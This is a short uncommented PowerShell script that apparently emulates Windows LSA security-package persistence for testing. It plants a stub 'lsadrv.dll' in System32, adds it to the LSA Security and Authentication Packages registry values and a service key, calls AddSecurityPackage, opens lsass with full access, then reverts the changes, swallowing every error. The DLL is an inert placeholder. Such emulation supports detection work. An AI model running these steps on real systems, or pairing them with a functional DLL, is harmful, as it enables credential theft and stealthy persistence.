$driverDll = "$env:TEMP\lsadrv.dll"
$pe = [byte[]]@(0x4D, 0x5A, 0x90, 0x00) + (New-Object byte[] 4092)
foreach ($exp in @("SpLsaModeInitialize","SpInitialize","SpShutDown","SpGetInfo")) {
    $bytes = [System.Text.Encoding]::ASCII.GetBytes($exp)
    $offset = 512 + ([Array]::IndexOf(@("SpLsaModeInitialize","SpInitialize","SpShutDown","SpGetInfo"), $exp) * 64)
    [Array]::Copy($bytes, 0, $pe, $offset, $bytes.Length)
}
try { [System.IO.File]::WriteAllBytes($driverDll, $pe) } catch {}
try { Copy-Item $driverDll "$env:SYSTEMROOT\System32\lsadrv.dll" -Force -ErrorAction Stop } catch {}

$lsaKey = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
$origSec = @("")
try { $origSec = (Get-ItemProperty -Path $lsaKey -Name "Security Packages" -ErrorAction Stop)."Security Packages" } catch {}
try { Set-ItemProperty -Path $lsaKey -Name "Security Packages" -Value (@($origSec) + @("lsadrv")) -ErrorAction Stop } catch {}

$origAuth = @("msv1_0")
try { $origAuth = (Get-ItemProperty -Path $lsaKey -Name "Authentication Packages" -ErrorAction Stop)."Authentication Packages" } catch {}
try { Set-ItemProperty -Path $lsaKey -Name "Authentication Packages" -Value (@($origAuth) + @("lsadrv")) -ErrorAction Stop } catch {}

$svcKey = "HKLM:\SYSTEM\CurrentControlSet\Services\lsadrv"
try {
    New-Item -Path $svcKey -Force -ErrorAction Stop | Out-Null
    New-ItemProperty -Path $svcKey -Name "ImagePath" -Value "System32\lsadrv.dll" -PropertyType String -Force | Out-Null
    New-ItemProperty -Path $svcKey -Name "Type" -Value 2 -PropertyType DWord -Force | Out-Null
    New-ItemProperty -Path $svcKey -Name "Start" -Value 2 -PropertyType DWord -Force | Out-Null
} catch {}

if (-not ('LsassDrv' -as [type])) {
    Add-Type -TypeDefinition @'
    using System;
    using System.Runtime.InteropServices;
    public class LsassDrv {
        [DllImport("secur32.dll", CharSet=CharSet.Unicode)]
        public static extern int AddSecurityPackage(string name, IntPtr opts);
        [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(int a, bool b, int p);
        [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr h);
    }
'@
}

[LsassDrv]::AddSecurityPackage("lsadrv", [IntPtr]::Zero) | Out-Null

$lsass = Get-Process lsass -ErrorAction SilentlyContinue
if ($lsass) {
    $h = [LsassDrv]::OpenProcess(0x1FFFFF, $false, $lsass.Id)
    if ($h -ne [IntPtr]::Zero) { [LsassDrv]::CloseHandle($h) | Out-Null }
}

try { Set-ItemProperty -Path $lsaKey -Name "Security Packages" -Value $origSec -ErrorAction Stop } catch {}
try { Set-ItemProperty -Path $lsaKey -Name "Authentication Packages" -Value $origAuth -ErrorAction Stop } catch {}
Remove-Item $svcKey -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $driverDll,"$env:SYSTEMROOT\System32\lsadrv.dll" -Force -ErrorAction SilentlyContinue
